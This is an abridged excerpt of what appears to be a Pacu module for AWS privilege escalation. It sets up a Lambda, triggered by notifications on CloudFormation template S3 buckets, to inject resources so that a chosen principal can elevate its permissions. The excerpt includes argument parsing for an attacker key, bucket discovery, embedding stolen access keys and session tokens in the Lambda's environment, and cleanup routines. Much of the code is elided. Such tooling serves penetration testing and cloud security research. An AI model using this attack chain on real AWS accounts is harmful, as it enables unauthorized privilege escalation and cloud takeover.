...
parser.add_argument(
    "--delete", action="store_true", help="Delete an existing deployment."
)
parser.add_argument(
    "--attacker-key",
    required=True,
...
parser.add_argument(
    "--bucket",
    help=" The S3 Bucket name to target, this is usually something like cf-templates-*.",
)
...
def get_bucket_name(s3: "mypy_boto3_s3.ServiceResource", lambda_dir: "Path") -> str:
    try:
        ...
        if e.response["Error"]["Code"] == "AccessDenied":
            raise PacuException(
                "Bucket discovery failed. If you know the S3 bucket you want to target specify the "
...
def main(args, pacu_main: "Main"):
    ...
    if not principal:
        print(
            "Must use the --principal argument to specify which user we want to be able to elevate permissions."
        )

    lambda_dir = (
        module_data_dir(pacu_main.running_module_names[-1])
        / "cfn__resource_injection_lambda"
    )
    ...
    if not deploy_key:
        print(
            f"Did not find the key {args.attacker_key} in pacu, make sure to set this with `set_keys` first."
        )
    ...
    s3_notifications_sess = get_session_from_key_name(
        pacu_main, s3_notifications_setup_key, region
    )
...
def deploy_lambda(
    ...
    if not deploy_dir.exists():
        shutil.copytree(
            (Path(__file__).parent / "cfn__resource_injection_lambda"),
            deploy_dir,
            dirs_exist_ok=True,
        )
    ...
    ] = s3_key.secret_access_key
    if s3_key.session_token:
        config["stages"]["dev"]["environment_variables"][
            "S3_AWS_SESSION_TOKEN"
        ] = s3_key.session_token
...
def delete_lambda(bucket_lambda_dir, env):
    ...
    subprocess.check_call(
        ["chalice", "--project-dir", str(bucket_lambda_dir), "delete"], env=env
    )
    shutil.rmtree(bucket_lambda_dir)


def get_session_from_key_name(
    pacu_main: "Main", key_name: str, region: str = "us-east-1"
):
    key: "AWSKey" = pacu_main.get_aws_key_by_alias(key_name)
    if not key:
        raise PacuException(
            f"Did not find the key {key_name} in pacu, make sure to set this with `set_keys` first."
        )
...
def put_bucket_notification(sess: "boto3.Session", bucket: str, lambda_arn: str):
    ...
    try:
        s3.put_bucket_notification_configuration(
            Bucket=bucket, NotificationConfiguration=conf
        )
...
def remove_bucket_notification(sess: "boto3.Session", bucket: str):
    ...
    s3.put_bucket_notification_configuration(
        Bucket=bucket, NotificationConfiguration=resp
    )


def remove_our_notification(
    resp: "NotificationConfigurationResponseMetadataTypeDef"
) -> "NotificationConfigurationTypeDef":
...
def remove_lambda_permission(sess: "boto3.Session", lambda_name: str):
    ...
    lambda_attacker.remove_permission(
        FunctionName=lambda_name, StatementId="cfn_notifications"
    )
